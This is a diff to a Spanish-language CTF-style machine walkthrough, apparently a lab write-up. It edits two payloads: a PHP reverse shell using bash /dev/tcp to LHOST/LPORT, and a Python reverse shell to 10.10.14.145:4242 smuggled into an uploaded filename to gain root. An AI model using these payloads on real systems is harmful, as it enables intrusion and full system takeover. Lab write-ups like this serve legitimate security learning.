@@ -421,7 +421,7 @@ A partir de aquí es muy fácil obtener acceso al sistema, solo tendremos que a�
 
 ![image](https://user-images.githubusercontent.com/67548295/145458815-e232867a-c930-43f7-9233-ceace30697e2.png)
  
- > Payload de reverse shell en PHP: \<\?php system\(\"/bin/bash -c \'bash \-i \>\& /dev/tcp/LHOST/LPORT 0\>\&1\'\"\)\; \?\>
+ > Payload de reverse shell en PHP: \<?php system\(\"/bin/bash -c \'bash \-i \>& /dev/tcp/LHOST/LPORT 0\>&1\'\"\); ?\>
 
 ¡Perfecto! Ya tenemos acceso a la máquina, ahora a escalar privilegios
 
@@ -907,12 +907,12 @@ local: |python3 -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c
 ```
 En este momento, nos llegaría una shell de nuestra propia máquina, solamente hay que hacer `ctrl + c` para parar el proceso y volverse a poner en escucha de nuevo.
 
-> Habría que subirlo así, por poblemas de comillas y demás: put "|python3 -c 'a=__import__;s=a("\\"socket\\");o=a(""\\"os\\").dup2;p=a(""\\"pty\\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((""\\"10.10.14.145\\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(""\\"sh\\")'.csv"
-> 
+> Habría que subirlo así, por poblemas de comillas y demás: 
+`put "\python3 -c 'a=__import__;s=a("\"socket\");o=a(""\"os\").dup2;p=a(""\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((""\"10.10.14.145\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(""\"sh\")'.csv"`
 
 ##### Paso 4 - Esperar por la shell
 
-Si lo hemos hecho bien, en cuestión de un minuto deberíamos de recivir una shell como usuario `root` en la máquina víctima.
+Si lo hemos hecho bien, en cuestión de un minuto deberíamos de recibir una shell como usuario `root` en la máquina víctima.
 
 ```bash
 ┌─[z3r0byte@z3r0byte]─[~]
